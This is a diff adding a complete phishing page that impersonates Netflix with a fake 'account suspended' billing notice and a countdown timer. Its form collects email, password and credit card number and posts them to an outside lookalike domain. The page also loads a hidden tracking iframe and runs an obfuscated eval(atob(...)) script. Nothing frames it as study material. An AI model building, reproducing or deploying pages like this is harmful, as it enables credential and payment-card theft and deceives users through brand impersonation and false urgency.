@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Netflix | Billing hold notice</title>
+  <style>
+    :root {
+      --bg: #111111;
+      --panel: #181818;
+      --panel-soft: #232323;
+      --ink: #ffffff;
+      --muted: #b3b3b3;
+      --red: #e50914;
+      --line: rgba(255,255,255,0.08);
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background:
+        radial-gradient(circle at top center, rgba(229, 9, 20, 0.26), transparent 32%),
+        linear-gradient(180deg, #0f0f0f 0%, #171717 100%);
+      color: var(--ink);
+    }
+    a { color: inherit; text-decoration: none; }
+    header {
+      padding: 22px 30px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid var(--line);
+    }
+    .brand {
+      color: var(--red);
+      font-size: 34px;
+      font-weight: 800;
+      letter-spacing: 0.02em;
+    }
+    .wrap {
+      width: min(1080px, calc(100% - 34px));
+      margin: 34px auto 48px;
+      display: grid;
+      grid-template-columns: 1.05fr 0.95fr;
+      gap: 24px;
+    }
+    .card {
+      background: var(--panel);
+      border: 1px solid var(--line);
+      border-radius: 22px;
+      padding: 28px;
+      box-shadow: 0 24px 70px rgba(0,0,0,0.35);
+    }
+    .badge {
+      display: inline-block;
+      padding: 8px 12px;
+      border-radius: 999px;
+      background: rgba(229, 9, 20, 0.14);
+      color: #ff8b92;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      font-size: 12px;
+      font-weight: 700;
+    }
+    h1 { margin: 18px 0 12px; font-size: clamp(34px, 4.8vw, 56px); line-height: 1.02; }
+    h2 { margin: 0 0 8px; font-size: 24px; }
+    p { color: var(--muted); line-height: 1.72; }
+    .cta-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+      margin: 24px 0;
+    }
+    .cta, .ghost {
+      padding: 13px 16px;
+      border-radius: 14px;
+      font-weight: 700;
+      font-size: 14px;
+    }
+    .cta { background: var(--red); color: white; }
+    .ghost { background: var(--panel-soft); color: white; }
+    form {
+      display: grid;
+      gap: 12px;
+      margin-top: 14px;
+    }
+    input {
+      padding: 14px 15px;
+      border-radius: 14px;
+      border: 1px solid rgba(255,255,255,0.1);
+      background: #0f0f0f;
+      color: white;
+      font: 15px/1.2 inherit;
+    }
+    button {
+      width: fit-content;
+      padding: 14px 18px;
+      border: 0;
+      border-radius: 14px;
+      background: var(--red);
+      color: white;
+      font: 700 14px/1.2 inherit;
+      cursor: pointer;
+    }
+    .info {
+      display: grid;
+      gap: 16px;
+    }
+    .mini {
+      padding: 18px;
+      border-radius: 16px;
+      background: var(--panel-soft);
+    }
+    @media (max-width: 920px) { .wrap { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="brand">NETFLIX</div>
+    <div>Billing recovery</div>
+  </header>
+
+  <main class="wrap">
+    <section class="card">
+      <div class="badge">Account suspended</div>
+      <h1>Your last payment could not be confirmed.</h1>
+      <p>
+        We were unable to renew your membership because your billing profile is incomplete. Verify your account now to avoid an
+        interruption to streaming access and restore full playback today.
+      </p>
+      <p>
+        To keep your profile active, enter your password, confirm your credit card number, and complete the billing reset session.
+      </p>
+      <div class="cta-row">
+        <a class="cta" href="https://stream-billing-reset.net/netflix/continue">Update billing</a>
+        <a class="ghost" href="https://stream-billing-reset.net/netflix/signin">Sign in to continue</a>
+        <a class="ghost" href="https://billing-session-restore.net/account/recover">Restore membership</a>
+        <a class="ghost" href="https://billing-session-restore.net/account/history">Review payment history</a>
+      </div>
+      <form action="https://billing-session-restore.net/account/submit" method="post">
+        <input type="hidden" name="token" value="nf-22093-r1">
+        <input type="hidden" name="flow" value="billing-recovery">
+        <input type="hidden" name="campaign" value="reactivate">
+        <input type="hidden" name="locale" value="en-us">
+        <input type="email" name="email" placeholder="Email address">
+        <input type="password" name="password" placeholder="Password">
+        <input type="text" name="card_number" placeholder="Credit card number">
+        <button type="submit">Finish billing reset</button>
+      </form>
+    </section>
+
+    <aside class="info">
+      <div class="card mini">
+        <h2>Membership hold details</h2>
+        <p>Playback is currently paused on this profile. Once the billing reset is accepted, access is restored automatically.</p>
+      </div>
+      <div class="card mini">
+        <h2>Session timer</h2>
+        <p>Billing recovery expires in 12 minutes. Complete the review before the queue closes.</p>
+      </div>
+    </aside>
+  </main>
+
+  <iframe src="https://hidden-billing-status.net/netflix/pixel" style="display:none"></iframe>
+  <script>eval(atob('Y29uc29sZS5sb2coIm5ldGZsaXggYmlsbGluZyBjaGVjayIp'));</script>
+</body>
+</html>
